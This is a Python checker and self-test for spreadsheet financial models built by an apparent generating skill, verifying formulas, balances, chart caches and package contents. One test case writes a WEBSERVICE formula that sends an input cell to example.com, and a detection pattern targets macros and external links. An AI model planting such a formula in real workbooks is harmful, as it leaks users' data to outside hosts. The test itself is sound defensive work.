#!/usr/bin/env python3
"""model_check.py — check a three-statement model workbook from this skill, including one a person has edited since.

    python3 model_check.py model.xlsx [model.xlsx ...]
    python3 model_check.py --selftest

It reads the file itself (every formula, and the value stored next to it) and works it all out again. What "the
way this skill writes it" means is not a list kept here: the workbook this skill would write for the same years is
built again, and every cell of the file is compared with it.
  K01  the workbook is laid out the way this skill lays it out: the six sheets, none hidden; every label, heading and
       line of the method word for word; every number shown in the format this skill gives it; and nothing on the
       Assumptions or Charts sheet that this skill does not write there — the other rules need it
  K02  no plugs: every cell of the statements and the checks holds exactly the formula this skill writes there, and
       nothing where it writes nothing — a number typed in, a constant written as a formula (=14400.30), or a formula
       edited to give the same total is a plug; an input on the Assumptions sheet is a plain number
  K03  every stored value is what its formula gives from the stored values it reads, so a viewer that does not
       recalculate shows what the formulas give (as xlformula.py works them out: its docstring says where that is
       known to differ from Excel)
  K04  the balance sheet adds up, and assets equal liabilities plus equity to the penny, at the start and every year
  K05  the income statement and the cash flow add up, and the three statements tie: net profit and depreciation
       carry to the cash flow, the working-capital lines are the balance sheet's changes, closing cash is the balance
       sheet's cash, and profit kept, equipment, loan and owners' money roll forward
  K06  the inputs are ones the builder accepts (a number, in its range: no depreciation above 100%, no negative days),
       and the numbers follow the method the Assumptions sheet states, worked out a second time from those inputs in
       plain Python (revenue, costs, depreciation, interest, tax, working capital, equipment bought, loan repaid)
  K07  the Checks sheet tells the truth about its own lines: it says Balanced only when every line on it is zero to the
       penny, and cash below zero only when the balance sheet's cash is (its five lines are a subset of K04 and K05,
       for a reader who never runs this checker)
  K08  the Assumptions sheet says whether the numbers are made up or where they come from, and that it is not advice
  K09  no macros, external links or embedded objects, no hyperlinks, and no relationship anywhere in the package that
       points outside it (a link on a chart, a picture from the web); a data connection (xl/connections.xml) is not
       looked at
  K10  the two charts this skill writes draw the cells it points them at, under the names it gives, and every chart's
       own copy of its numbers matches the cells; the copies of the year labels, the titles, and what any further chart
       draws are not compared
  K11  no emoji or icon characters in the workbook (make_model.py's set: the pictograph blocks, ‼ ⁉ ℹ, and most
       arrows Unicode lists as emoji, though not ⤴ ⤵; → © ® ™ are text)
Edits are read at the level of the file's cells, charts and parts. A workbook saved again by a spreadsheet program has
not been tested here: its storage may differ in ways this reads as edits. A shared formula (how Excel stores a
filled-down run) is read as the formula it stands for when it is stored the usual way; in a group where more than one
cell carries formula text, this reader and openpyxl can expand a cell differently.
Not looked at, so an edit there passes: conditional formats, drawings and text boxes, hidden rows and columns, merged
cells, fonts and colours, phonetic guides inside a text (read here as part of it), data connections, the
precision-as-displayed setting, and the note under each sheet's title, which is free text like the business's name.
A warning, not a finding: cash below zero at the start or at a year end (the model would need money it does not
include).
Exit 0 no findings · 1 findings · 2 usage or selftest failed.
"""
import os, re, sys, zipfile
from xml.etree import ElementTree as ET

sys.dont_write_bytecode = True
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import ooxml as O
import xlformula as X
import make_model as M

ICONS = M.ICONS
PENNY = 0.005
STATEMENTS = ("Income statement", "Balance sheet", "Cash flow", "Checks")
RANGE = {path: (lo, hi, words) for path, lo, hi, words in M.RANGES}


def reference(n, first_year):
    """what this skill writes for n years from first_year: {sheet: {ref: (kind, text or None, formula, format code)}},
    and the charts' specs. The inputs are the example's; the layout, the formulas and the formats do not depend on them."""
    b = dict(M.EXAMPLE, years=n, first_year=first_year)
    wb, _ = M.build(b)
    codes = {i: code for code, i in wb.styles.numfmts.items()}
    builtin = {1: "0", 2: "0.00", 3: "#,##0", 4: "#,##0.00", 9: "0%", 10: "0.00%"}
    out = {}
    for sh in wb.sheets:
        cells = {}
        for (r, c), (kind, value, formula, st) in sh.cells.items():
            nf = wb.styles.xfs[st][3]
            cells[O.ref(r, c)] = (kind, value if kind == "s" else None, formula, codes.get(nf, builtin.get(nf, "General")))
        out[sh.name] = cells
    charts = next(sh.charts for sh in wb.sheets if sh.name == "Charts")
    return out, charts


def free_text(sheet, ref):
    """cells whose words come from the business (its name, description, currency, sources) rather than from this skill"""
    return ref in ("A1", "A2") or (sheet == "Assumptions" and (ref == "A3" or (ref[0] == "C" and ref[1:].isdigit())))


def close(a, b):
    """two stored numbers that should be the same calculation: equal to a millionth, or to the ninth significant digit"""
    return a is not None and b is not None and abs(a - b) <= max(1e-6, 1e-9 * max(abs(a), abs(b)))


def check_file(path):
    """(findings [(code, message)], warnings [message])"""
    cells, parts = O.read(path)
    return check_book(cells, parts)


def check_book(cells, parts):
    found, warn = [], []
    add = lambda code, m: found.append((code, m))

    def val(sheet, r, c):
        return cells.get(sheet, {}).get(O.ref(r, c), {}).get("value")

    # K01 the layout
    if list(cells) != M.SHEETS:
        add("K01", f"the sheets are {list(cells)}, not the six this skill writes ({', '.join(M.SHEETS)}) — not a model from this skill, or one rearranged")
        return found, warn
    hidden = [s.get("name") for s in ET.fromstring(parts["xl/workbook.xml"]).iter("{%s}sheet" % O.NS) if s.get("state") in ("hidden", "veryHidden")]
    for name in hidden:
        add("K01", f"the sheet {name} is hidden; this skill shows all six")
    years = []
    c = 2
    while isinstance(val("Income statement", 3, c), str) and val("Income statement", 3, c).strip():
        years.append(val("Income statement", 3, c)); c += 1
    n = len(years)
    if not 1 <= n <= 10:
        add("K01", f"the income statement has {n} year columns; this skill writes 1 to 10"); return found, warn
    first = int(years[0]) if years[0].isdigit() else 2000
    ref_cells, ref_charts = reference(n, first)
    inputs = {f"B{row}" for row, _, _, _, _ in M.ASSUMPTIONS}
    trees = {}
    for sheet in M.SHEETS:
        have, want = cells[sheet], ref_cells[sheet]
        for ref in sorted(set(have) | set(want), key=lambda x: O.split_ref(x)):
            h, w = have.get(ref), want.get(ref)
            filled = h is not None and (h["value"] is not None or h["formula"] is not None)
            where = f"{sheet}!{ref}"
            if w is None or w[0] == "blank" and w[2] is None:
                if filled:
                    shown = f"={h['formula']}" if h["formula"] is not None else repr(h["value"])
                    if sheet in STATEMENTS:
                        add("K02", f"{where} holds {shown[:80]} where this skill writes nothing: a number put there is a plug")
                    else:
                        add("K01", f"{where} holds {shown[:80]} where this skill writes nothing")
                continue
            kind, text, formula, code = w
            if formula is not None:                          # a statement or check: exactly the skill's formula
                if h is None or h["formula"] is None:
                    add("K02", f"{where} ({_label(sheet, O.split_ref(ref)[0])}) holds {'nothing' if not filled else repr(h['value'])} "
                               f"where this skill writes ={formula}: a number typed in is a plug")
                else:
                    try:                                      # whatever the formula is, its stored value is checked (K03)
                        trees[(sheet, ref)] = X.parse(h["formula"])
                        unread = ""
                    except X.FormulaError as e:
                        unread = f" (and this checker cannot read it: {e})"
                    if h["formula"] != formula:
                        add("K02", f"{where} has ={h['formula'][:80]}, where this skill writes ={formula}{unread}")
            elif sheet == "Assumptions" and ref in inputs:
                if h is not None and h["formula"] is not None:
                    add("K02", f"{where} is an input and holds the formula ={h['formula'][:80]}; an input is a plain number")
            elif kind == "s":
                if h is None or h["formula"] is not None or not isinstance(h["value"], str):
                    add("K01", f"{where} should hold text, and holds {'nothing' if not filled else ('=' + h['formula']) if h['formula'] else repr(h['value'])}")
                elif not free_text(sheet, ref) and h["value"] != text:
                    add("K01", f"{where} reads {h['value'][:80]!r}, where this skill writes {text!r}")
            if h is not None and filled and h.get("numfmt", code) != code:
                add("K01", f"{where} is shown in the format {h['numfmt']!r}, where this skill writes {code!r}")
    # (the cell-by-cell comparison does not stop the rules after it: a changed line of text should not hide a plug)
    # K03 stored values are what the formulas give
    get = lambda s, ref: cells.get(s, {}).get(ref, {}).get("value")
    for (sheet, ref), tree in sorted(trees.items()):
        try:
            want = X.evaluate(tree, sheet, get)
        except X.FormulaError as e:
            add("K03", f"{sheet}!{ref}: its formula gives an error ({e}), yet the file stores {get(sheet, ref)!r}"); continue
        have = get(sheet, ref)
        same = (want == have) if isinstance(want, (str, bool)) or isinstance(have, (str, bool)) else close(float(want), have)
        if not same:
            add("K03", f"{sheet}!{ref} stores {have!r} but its formula ={cells[sheet][ref]['formula']} gives {want!r}")

    def v(sheet, key, i):
        rows, colf = {"Income statement": (M.IS, M.ycol), "Balance sheet": (M.BS, M.bcol), "Cash flow": (M.CF, M.ycol)}[sheet]
        x = val(sheet, rows[key], colf(i))
        return x if isinstance(x, (int, float)) and not isinstance(x, bool) else (0.0 if x is None else float("nan"))

    def off(a, b):
        return not (abs(a - b) < PENNY)

    # K04 the balance sheet adds up and balances
    k04 = []
    for i in range(0, n + 1):
        name = "Start" if i == 0 else years[i - 1]
        assets = v("Balance sheet", "cash", i) + v("Balance sheet", "recv", i) + v("Balance sheet", "stock", i) + v("Balance sheet", "equip", i)
        liab = v("Balance sheet", "pay", i) + v("Balance sheet", "loan", i)
        equity = v("Balance sheet", "capital", i) + v("Balance sheet", "retained", i)
        for key, want in (("assets", assets), ("liab", liab), ("equity", equity), ("le", v("Balance sheet", "liab", i) + v("Balance sheet", "equity", i))):
            if off(v("Balance sheet", key, i), want):
                k04.append(f"{name}: {M.BS_LABELS[key]} reads {v('Balance sheet', key, i):,.2f}, but its lines add up to {want:,.2f}")
        if off(assets, liab + equity):
            k04.append(f"{name}: assets {assets:,.2f} against liabilities plus equity {liab + equity:,.2f}, {assets - liab - equity:+,.2f} apart")
    for m in k04:
        add("K04", "the balance sheet: " + m)
    # K05 the other two statements add up, and the three tie
    k05 = []
    for i in range(1, n + 1):
        y, g = years[i - 1], lambda s, k, j=i: v(s, k, j)
        tie = [
            ("gross profit is revenue less cost of sales", g("Income statement", "gross"), g("Income statement", "revenue") - g("Income statement", "cogs")),
            ("operating profit is gross profit less fixed costs and depreciation", g("Income statement", "ebit"),
             g("Income statement", "gross") - g("Income statement", "fixed") - g("Income statement", "dep")),
            ("profit before tax is operating profit less interest", g("Income statement", "pbt"), g("Income statement", "ebit") - g("Income statement", "interest")),
            ("net profit is profit before tax less tax", g("Income statement", "net"), g("Income statement", "pbt") - g("Income statement", "tax")),
            ("the cash flow starts from the income statement's net profit", g("Cash flow", "net"), g("Income statement", "net")),
            ("the cash flow adds back the income statement's depreciation", g("Cash flow", "dep"), g("Income statement", "dep")),
            ("the change in money owed by customers is the balance sheet's", g("Cash flow", "recv"), v("Balance sheet", "recv", i - 1) - v("Balance sheet", "recv", i)),
            ("the change in stock is the balance sheet's", g("Cash flow", "stock"), v("Balance sheet", "stock", i - 1) - v("Balance sheet", "stock", i)),
            ("the change in money owed to suppliers is the balance sheet's", g("Cash flow", "pay"), v("Balance sheet", "pay", i) - v("Balance sheet", "pay", i - 1)),
            ("cash from operations adds up", g("Cash flow", "ops"), sum(g("Cash flow", k) for k in ("net", "dep", "recv", "stock", "pay"))),
            ("the change in cash adds up", g("Cash flow", "change"), g("Cash flow", "ops") + g("Cash flow", "inv") + g("Cash flow", "fin")),
            ("cash at the start of the year is last year's balance sheet cash", g("Cash flow", "open"), v("Balance sheet", "cash", i - 1)),
            ("cash at the end of the year is the start plus the change", g("Cash flow", "close"), g("Cash flow", "open") + g("Cash flow", "change")),
            ("the balance sheet's cash is the cash flow's closing cash", v("Balance sheet", "cash", i), g("Cash flow", "close")),
            ("profit kept is last year's plus net profit", v("Balance sheet", "retained", i), v("Balance sheet", "retained", i - 1) + g("Income statement", "net")),
            ("equipment is last year's plus equipment bought less depreciation", v("Balance sheet", "equip", i),
             v("Balance sheet", "equip", i - 1) - g("Cash flow", "capex") - g("Income statement", "dep")),
            ("the loan is last year's less the repayment", v("Balance sheet", "loan", i), v("Balance sheet", "loan", i - 1) + g("Cash flow", "repay")),
            ("owners' money stays what was put in", v("Balance sheet", "capital", i), v("Balance sheet", "capital", i - 1)),
            ("cash from investing is the equipment bought", g("Cash flow", "inv"), g("Cash flow", "capex")),
            ("cash from financing is the loan repaid", g("Cash flow", "fin"), g("Cash flow", "repay")),
        ]
        for words, got, want in tie:
            if off(got, want):
                k05.append(f"{y}: {words} — {got:,.2f} against {want:,.2f}")
    for m in k05:
        add("K05", m)
    # K06 the inputs, then the method the Assumptions sheet states
    b = {"years": n, "first_year": int(years[0]) if years[0].isdigit() else 0, "tax_rate": 0.0}
    usable = True
    for row, label, path, fmt, note in M.ASSUMPTIONS:
        node, keys = b, path.split(".")
        for k in keys[:-1]:
            node = node.setdefault(k, {})
        x = val("Assumptions", row, 2)
        lo, hi, words = RANGE[path]
        if isinstance(x, bool) or not isinstance(x, (int, float)) or not lo <= x <= hi or (path == "funding.loan_years" and x != int(x)):
            add("K06", f"Assumptions!B{row} ({label}) is {x!r}: the builder accepts {words} only between {lo:g} and {hi:g}"
                       + (" and whole" if path == "funding.loan_years" else ""))
            usable = False
            continue
        node[keys[-1]] = int(x) if path == "funding.loan_years" else x
    d = M.direct(b) if usable else None
    if d:
        pairs = [("Balance sheet", k, 0, d["start"][k]) for k in ("cash", "equip", "loan", "capital")]
        for i, yv in enumerate(d["years"], 1):
            pairs += [("Income statement", "revenue", i, yv["revenue"]), ("Income statement", "cogs", i, yv["cogs"]),
                      ("Income statement", "dep", i, yv["dep"]), ("Income statement", "interest", i, yv["interest"]),
                      ("Income statement", "tax", i, yv["tax"]),
                      ("Income statement", "fixed", i, b["costs"]["fixed_costs"] * (1 + b["costs"]["fixed_cost_growth"]) ** (i - 1)),
                      ("Balance sheet", "recv", i, yv["recv"]), ("Balance sheet", "stock", i, yv["stock"]), ("Balance sheet", "pay", i, yv["pay"]),
                      ("Cash flow", "capex", i, -b["equipment"]["yearly"]), ("Cash flow", "repay", i, -yv["repay"])]
        for sheet, key, i, want in pairs:
            got = v(sheet, key, i)
            if off(got, want):
                labels = {"Income statement": M.IS_LABELS, "Balance sheet": M.BS_LABELS, "Cash flow": M.CF_LABELS}[sheet]
                add("K06", f"{sheet}, {labels[key]}, {'Start' if i == 0 else years[i - 1]}: {got:,.2f}, where the stated method gives {want:,.2f}")
    # K07 the Checks sheet tells the truth
    said = val("Checks", M.CK["result"], 2)
    lines = [(key, i, val("Checks", M.CK[key], M.bcol(i))) for key in ("balance", "cash", "retained", "equip", "loan")
             for i in range(0 if key == "balance" else 1, n + 1)]
    nonzero = [f"{M.CK_LABELS[key]} ({'Start' if i == 0 else years[i - 1]}): {x!r}" for key, i, x in lines
               if not (isinstance(x, (int, float)) and not isinstance(x, bool) and abs(x) < PENNY)]
    if not isinstance(said, str) or said.startswith("Balanced") != (not nonzero):
        add("K07", f"the Checks sheet says {said!r}, but " + ("every line on it is zero" if not nonzero else f"{len(nonzero)} of its lines are not: {nonzero[0]}"))
    cash = [v("Balance sheet", "cash", i) for i in range(0, n + 1)]
    low = [("Start" if i == 0 else years[i - 1], x) for i, x in enumerate(cash) if x < 0]
    neg = val("Checks", M.CK["negative"], 2)
    if not isinstance(neg, str) or neg.startswith("Yes") != bool(low):
        add("K07", f"the Checks sheet says cash below zero: {neg!r}, but the balance sheet's cash is " + (f"below zero in {low[0][0]}" if low else "never below zero"))
    if low:
        warn.append(f"cash is below zero in {', '.join(y for y, _ in low)} (lowest {min(x for _, x in low):,.2f}): the model needs money it does not include")
    # K08 honesty
    note = val("Assumptions", 3, 1) or ""
    if "not financial advice" not in note or not (note.startswith("Illustrative:") or note.startswith("Where the numbers come from:")):
        add("K08", "Assumptions!A3 should say whether the numbers are made up (\"Illustrative: …\") or where they come from, and that this is not financial advice")
    # K09 macros, external links, embedded objects, hyperlinks, relationships that point outside the package
    for name in parts:
        if re.search(r"vbaProject|externalLink|activeX|embeddings/|\.bin$", name, re.I):
            add("K09", f"the package holds {name}: macros, external links and embedded objects have no place in this model")
    for name, blob in parts.items():
        if name.startswith("xl/worksheets/") and name.endswith(".xml") and (b"<hyperlink" in blob or b"<hyperlinks" in blob):
            add("K09", f"{name} holds a hyperlink")
    for name in sorted(p for p in parts if p.endswith(".rels")):
        for rel in ET.fromstring(parts[name]):
            if rel.get("TargetMode") == "External":
                add("K09", f"{name} points outside the package, to {rel.get('Target', '?')[:80]}")
    # K10 what the charts draw, and their own copies of the numbers
    ns = {"c": O.C}
    for k, spec in enumerate(ref_charts, 1):
        name = f"xl/charts/chart{k}.xml"
        if name not in parts:
            add("K10", f"{name} is missing: this skill draws {spec['title']!r} there"); continue
        drawn = [((s.findtext("c:tx/c:v", default=None, namespaces=ns) or s.findtext("c:tx/c:strRef/c:f", default="?", namespaces=ns)),
                  s.findtext("c:cat/c:strRef/c:f", default=None, namespaces=ns) or s.findtext("c:cat/c:numRef/c:f", default=None, namespaces=ns),
                  s.findtext("c:val/c:numRef/c:f", default=None, namespaces=ns)) for s in ET.fromstring(parts[name]).iter("{%s}ser" % O.C)]
        meant = [(sname, spec["categories"][0], vref) for sname, vref, _, _ in spec["series"]]
        if drawn != meant:
            add("K10", f"{name} draws {drawn}, where this skill draws {meant}")
    for name in sorted(p for p in parts if p.startswith("xl/charts/chart") and p.endswith(".xml")):
        root = ET.fromstring(parts[name])
        for ser in root.iter("{%s}ser" % O.C):
            f = ser.find("c:val/c:numRef/c:f", ns)
            pts = [float(p.find("c:v", ns).text) for p in ser.findall("c:val/c:numRef/c:numCache/c:pt", ns)]
            if f is None:                       # a series that points at no cells is already named above
                continue
            sheet, span = X.split_sheet(f.text, "")
            a, z = span.replace("$", "").split(":")
            (r0, c0), (r1, c1) = O.split_ref(a), O.split_ref(z)
            live = [val(sheet, r, col) for r in range(r0, r1 + 1) for col in range(c0, c1 + 1)]
            if len(live) != len(pts) or not all(close(float(x or 0), y) for x, y in zip(live, pts)):
                add("K10", f"{name}: the chart's copy of {f.text} is {pts}, the cells hold {live}")
    # K11 no emoji or icon characters
    for sheet, cs in cells.items():
        for ref, cell in cs.items():
            if isinstance(cell["value"], str) and ICONS.search(cell["value"]):
                add("K11", f"{sheet}!{ref} holds an icon character: {ICONS.search(cell['value']).group(0)!r}")
    return found, warn


def _label(sheet, row):
    rows, labels = {"Income statement": (M.IS, M.IS_LABELS), "Balance sheet": (M.BS, M.BS_LABELS), "Cash flow": (M.CF, M.CF_LABELS), "Checks": (M.CK, M.CK_LABELS)}[sheet]
    return next((labels[k] for k, r in rows.items() if r == row), "?")


# ---- selftest: a clean model, and for every rule one made wrong in the way that rule is there to catch -------------------
def _save(wb, t, name):
    p = os.path.join(t, name + ".xlsx"); wb.save(p); return p


def _cell(wb, sheet, ref):
    s = next(x for x in wb.sheets if x.name == sheet)
    return s, O.split_ref(ref)


def _plug(wb, sheet, ref):                        # the right number, typed in, with no formula
    s, key = _cell(wb, sheet, ref); kind, value, formula, st = s.cells[key]; s.cells[key] = (kind, value, None, st)


def _restore(wb, sheet, ref, delta):              # the stored value moved, the formula left alone
    s, key = _cell(wb, sheet, ref); kind, value, formula, st = s.cells[key]; s.cells[key] = (kind, value + delta, formula, st)


def _zip_edit(path, name, fn):
    with zipfile.ZipFile(path) as z:
        parts = {n: z.read(n) for n in z.namelist()}
    parts = fn(parts) if name is None else dict(parts, **{name: fn(parts[name])})
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for n, blob in parts.items():
            z.writestr(n, blob)


def selftest():
    import json, tempfile
    ok = []
    E = M.EXAMPLE
    c = M.O.col_letter

    def case(name, want, make, extra=None):
        with tempfile.TemporaryDirectory() as t:
            try:
                path = make(t)
                found, warn = check_file(path)
                got = {code for code, _ in found}
                detail = [f"{a} {b}" for a, b in found]
                if extra:
                    good = got == want and extra(found, warn)
                else:
                    good = got == want
            except Exception as e:                  # a sample that cannot even be built proves nothing either way
                got, detail, good = {"CRASH"}, [f"{type(e).__name__}: {e}"], False
        ok.append(good)
        print(f"  {'✔' if good else '✘'} {name} → want {sorted(want) or ['clean']}, got {sorted(got) or ['clean']}")
        if not good:
            for d in detail[:4]:
                print(f"        {d[:160]}")

    def built(bend=None, biz=None, edit=None, zipped=None):
        def make(t):
            wb, _ = M.build(biz or E, bend=bend)
            if edit:
                edit(wb)
            p = _save(wb, t, "m")
            if zipped:
                zipped(p)
            return p
        return make

    y1 = c(M.ycol(1))
    b1, b2 = c(M.bcol(1)), c(M.bcol(2))
    case("clean", set(), built())
    case("K01 a sheet renamed", {"K01"}, built(edit=lambda wb: setattr(wb.sheets[3], "name", "Cashflow")))
    case("K01 a row label changed", {"K01"}, built(edit=lambda wb: wb.sheets[1].set(M.IS["revenue"], 1, "Sales")))
    case("K01 a seventh sheet added", {"K01"}, built(edit=lambda wb: wb.sheet("Notes")))
    eleven = json.loads(json.dumps(E)); eleven["years"] = 11
    case("K01 eleven years (the skill writes 1 to 10)", {"K01"}, built(biz=eleven))
    def no_years(wb):
        for col in range(2, 2 + E["years"]):
            wb.sheets[1].cells.pop((3, col), None)
    case("K01 no year columns on the income statement", {"K01"}, built(edit=no_years))
    case("K01 an assumption's label changed", {"K01"}, built(edit=lambda wb: wb.sheets[0].set(6, 1, "Units sold", style="label")))
    case("K01 year headers that disagree between statements", {"K01"}, built(edit=lambda wb: wb.sheets[2].set(3, M.bcol(3), "2030", style="headnum")))
    case("K02 a number typed in where a formula belongs (a plug)", {"K02"}, built(edit=lambda wb: _plug(wb, "Balance sheet", f"{b2}{M.BS['cash']}")))
    case("K02 a formula outside what the checker can verify", {"K02"}, built(edit=lambda wb: _swap_formula(wb, "Income statement", f"{y1}{M.IS['revenue']}",
                                                                                                          f"PRODUCT({y1}{M.IS['units']},{y1}{M.IS['price']})")))
    case("K03 a stored value that is not its formula's result", {"K03"}, built(edit=lambda wb: _restore(wb, "Income statement", f"{y1}{M.IS['units']}", 1.0)))
    case("K03 a formula that divides by zero, with a number stored beside it", {"K02", "K03"},
         built(edit=lambda wb: _swap_formula(wb, "Income statement", f"{y1}{M.IS['revenue']}", f"{y1}{M.IS['units']}/0")))
    def drop_equipment(fx):
        fx[("Balance sheet", M.BS["assets"], M.bcol(1))] = f"SUM({b1}{M.BS['cash']}:{b1}{M.BS['stock']})"
    case("K04 a total that leaves a line out", {"K02", "K04"}, built(bend=drop_equipment))
    def both_totals_up(fx):
        fx[("Balance sheet", M.BS["assets"], M.bcol(1))] += "+100"
        fx[("Balance sheet", M.BS["le"], M.bcol(1))] += "+100"
    case("K04 two totals out by the same amount, so the difference row still reads zero", {"K02", "K04"}, built(bend=both_totals_up))
    def owed_from_nowhere(fx):
        fx[("Balance sheet", M.BS["recv"], M.bcol(0))] = "100"
    case("K04 money owed by customers at the start, from nowhere", {"K02", "K04"}, built(bend=owed_from_nowhere))
    def compensating(fx):
        fx[("Cash flow", M.CF["net"], M.ycol(2))] += "+100"
        fx[("Cash flow", M.CF["stock"], M.ycol(2))] += "-100"
    case("K05 two errors that cancel: the cash flow's profit is wrong and its stock line hides it", {"K02", "K05"}, built(bend=compensating))
    def double_interest(fx):
        for i in range(1, E["years"] + 1):
            fx[("Income statement", M.IS["interest"], M.ycol(i))] += "*2"
    case("K06 interest at twice the stated rate, everything else consistent", {"K02", "K06"}, built(bend=double_interest))
    def says_not(fx):
        fx[("Checks", M.CK["result"], 2)] = '"NOT balanced: see the rows above"'
    case("K07 a Checks sheet that says NOT balanced about a balanced model", {"K02", "K07"}, built(bend=says_not))
    broke = json.loads(json.dumps(E)); broke["costs"]["fixed_costs"] = 120000
    def says_no(fx):
        fx[("Checks", M.CK["negative"], 2)] = '"No"'
    case("K07 a Checks sheet that says cash never goes below zero when it does", {"K02", "K07"}, built(bend=says_no, biz=broke))
    case("K08 the not-advice sentence removed", {"K08"}, built(edit=lambda wb: wb.sheets[0].set(3, 1, "Illustrative: the numbers are made up.", style="note")))
    case("K09 a macro in the package", {"K09"}, built(zipped=lambda p: _zip_edit(p, None, lambda parts: dict(parts, **{"xl/vbaProject.bin": b"\x00macro"}))))
    case("K09 a hyperlink in a sheet", {"K09"}, built(zipped=lambda p: _zip_edit(p, "xl/worksheets/sheet1.xml",
                                                                          lambda blob: blob.replace(b"<pageMargins", b'<hyperlinks><hyperlink ref="A1" display="x"/></hyperlinks><pageMargins', 1))))
    case("K10 a chart whose copy of the numbers is stale", {"K10"}, built(zipped=lambda p: _zip_edit(p, "xl/charts/chart1.xml",
                                                                                           lambda blob: blob.replace(b"<c:v>108000</c:v>", b"<c:v>99000</c:v>", 1))))
    case("K10 a chart series that points at no cells", {"K10"}, built(zipped=lambda p: _zip_edit(p, "xl/charts/chart2.xml",
                                                                                         lambda blob: __import__("re").sub(rb"<c:val><c:numRef><c:f>[^<]*</c:f>", b"<c:val><c:numRef>", blob, count=1))))
    case("K11 an icon in the description", {"K11"}, built(edit=lambda wb: wb.sheets[0].set(2, 1, E["description"] + " \U0001f6b2", style="note")))
    case("a business whose cash goes below zero: no finding, one warning", set(), built(biz=broke),
         extra=lambda found, warn: len(warn) == 1 and "below zero" in warn[0])
    even = json.loads(json.dumps(E)); even["funding"].update(equity=17129.37, loan=10590.9); even["equipment"]["initial"] = 27720.27
    case("a business whose start cash is exactly nothing: no finding and no warning", set(), built(biz=even),
         extra=lambda found, warn: not warn)
    # what the 2026-09-23 audit found passing: each edit below was made to a copy of the example and got 0 findings
    def hide_checks(p):
        _zip_edit(p, "xl/workbook.xml", lambda blob: blob.replace(b'<sheet name="Checks"', b'<sheet name="Checks" state="hidden"', 1))
    case("K01 the Checks sheet hidden", {"K01"}, built(zipped=hide_checks))
    def no_sign(wb):
        codes = wb.styles.numfmts
        old = next(k for k in codes if k.startswith("#,##0;(#,##0)"))
        codes['#,##0;#,##0;"\u2013"'] = codes.pop(old)
    case("K01 losses shown without their brackets", {"K01"}, built(edit=no_sign))
    case("K01 a line of the method rewritten", {"K01"}, built(edit=lambda wb: wb.sheets[0].set(34, 1, "Depreciation is straight-line over five years.", style="text")))
    case("K01 a formula added beside the inputs", {"K01"}, built(edit=lambda wb: wb.sheets[0].set(6, 4, 0, formula='WEBSERVICE("https://example.com/?p="&B8)')))
    case("K02 a plug written as a formula", {"K02"}, built(edit=lambda wb: _swap_formula(wb, "Balance sheet", f"{b1}{M.BS['cash']}",
                                                                                       O.number_text(wb.sheets[2].cells[O.split_ref(f"{b1}{M.BS['cash']}")][1]))))
    def openings(wb):
        wb.sheets[2].set(M.BS["recv"], 2, 1000, style="money"); wb.sheets[2].set(M.BS["retained"], 2, 1000, style="money")
    case("K02 opening balances typed into the blank start cells", {"K02", "K03", "K04", "K05"}, built(edit=openings))
    case("K02 an input written as a formula", {"K02"}, built(edit=lambda wb: _swap_formula(wb, "Assumptions", "B6", "2400")))
    def same_totals(fx):
        for i in range(1, E["years"] + 1):
            fx[("Income statement", M.IS["units"], M.ycol(i))] += "*2"
            fx[("Income statement", M.IS["price"], M.ycol(i))] += "/2"
            fx[("Income statement", M.IS["ucost"], M.ycol(i))] += "/2"
    case("K02 formulas edited so every total stays the same", {"K02"}, built(bend=same_totals))
    def shared(p):
        def edit(blob):
            import re as _re
            text = blob.decode("utf-8")
            f1 = _re.search(r'<c r="C4"[^>]*><f>([^<]*)</f>', text).group(1)
            text = text.replace(f'<f>{f1}</f>', f'<f t="shared" ref="C4:D4" si="0">{f1}</f>', 1)
            f2 = _re.search(r'<c r="D4"[^>]*><f>([^<]*)</f>', text).group(1)
            return text.replace(f'<f>{f2}</f>', '<f t="shared" si="0"/>', 1).encode("utf-8")
        _zip_edit(p, "xl/worksheets/sheet2.xml", edit)
    case("clean: a run of formulas stored the way Excel shares them", set(), built(zipped=shared))
    fast = json.loads(json.dumps(E)); fast["equipment"]["depreciation_rate"] = 1.5
    case("K06 an input the builder would refuse (depreciation at 150%)", {"K06"}, built(biz=fast))
    def zero_years(p):
        import re as _re
        _zip_edit(p, "xl/worksheets/sheet1.xml", lambda blob: _re.sub(rb'(<c r="B27"[^>]*>)<v>[^<]*</v>', rb"\g<1><v>0</v>", blob, count=1))
    case("K06 the loan's years typed as 0", {"K03", "K06"}, built(zipped=zero_years))
    def outside(p):
        def rels(parts):
            name = next(n for n in parts if n.startswith("xl/drawings/_rels/"))
            blob = parts[name].replace(b"</Relationships>", b'<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
                                                               b'Target="https://example.com/" TargetMode="External"/></Relationships>', 1)
            return dict(parts, **{name: blob})
        _zip_edit(p, None, rels)
    case("K09 a link on a chart that points outside the file", {"K09"}, built(zipped=outside))
    def swapped(p):
        def edit(blob):
            return blob.replace(b"<c:v>Revenue</c:v>", b"<c:v>@@</c:v>", 1).replace(b"<c:v>Net profit</c:v>", b"<c:v>Revenue</c:v>", 1).replace(b"<c:v>@@</c:v>", b"<c:v>Net profit</c:v>", 1)
        _zip_edit(p, "xl/charts/chart1.xml", edit)
    case("K10 a chart's two series under each other's names", {"K10"}, built(zipped=swapped))
    case("K01 a heading replaced by a number", {"K01"}, built(edit=lambda wb: wb.sheets[2].set(3, 2, 0, style="headnum")))
    case("K10 a chart missing from the file", {"K10"}, built(zipped=lambda p: _zip_edit(p, None, lambda parts: {k: v for k, v in parts.items() if k != "xl/charts/chart2.xml"})))
    case("K11 an emoji punctuation mark in the description", {"K11"}, built(edit=lambda wb: wb.sheets[0].set(2, 1, E["description"] + " \u203c", style="note")))
    print(f"model_check selftest: {sum(ok)}/{len(ok)} passed")
    return 0 if all(ok) else 2


def _swap_formula(wb, sheet, ref, formula):
    s, key = _cell(wb, sheet, ref); kind, value, _, st = s.cells[key]; s.cells[key] = (kind, value, formula, st)


def main(argv):
    if "--selftest" in argv:
        return selftest()
    paths = [a for a in argv if not a.startswith("--")]
    if not paths:
        print(__doc__.strip().split("\n\n")[1]); return 2
    total = 0
    for p in paths:
        try:
            found, warn = check_file(p)
        except (OSError, zipfile.BadZipFile, KeyError, ET.ParseError) as e:
            print(f"cannot read {p} as a workbook: {e}"); return 2
        except Exception as e:                     # never a traceback with the exit code that means "findings"
            print(f"cannot check {p}: {type(e).__name__}: {e}"); return 2
        total += len(found)
